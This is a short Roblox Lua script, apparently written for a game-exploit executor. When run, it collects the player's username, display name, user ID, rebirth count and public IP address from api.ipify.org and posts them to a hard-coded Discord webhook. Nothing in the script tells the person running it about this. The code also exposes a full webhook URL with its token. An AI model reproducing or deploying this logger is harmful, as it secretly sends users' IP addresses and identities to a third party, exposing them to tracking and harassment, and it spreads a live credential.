    local HttpService = game:GetService("HttpService")
    local plrName = game.Players.LocalPlayer.Name
    local webhook_url = "https://discord.com/api/webhooks/935195281400692796/_cgDmETKlWY9SWYVhlkOcT1xL8rbYXgI3hvbyL5VOYLCFv3_txlFOzjklrNP-1p2_ZN1"
    function sendMessagelog(msg)
        local data =
            {
                ["username"] = tostring(game.Players.LocalPlayer.Name) .. " (" .. tostring(game.Players.LocalPlayer.DisplayName) .. ")",
                ["avatar_url"] = "https://www.roblox.com/HeadShot-thumbnail/image?userId=" .. tostring(game.Players.LocalPlayer.UserId) .. "&width=420&height=420&format=png",
                ["content"] = msg,
            }
            local headers = {
                    ["content-type"] = "application/json"
            }
            
            local request_body_encoded = HttpService:JSONEncode(data)
            local request_payload = {Url=webhook_url, Body=request_body_encoded, Method="POST", Headers=headers}
            syn.request(request_payload)
        end
    if game.Players.LocalPlayer.Rebirths.Value >= 500000 then
    sendMessagelog("**" .. plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ") @everyone**")
    else
    sendMessagelog(plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ")")
    end
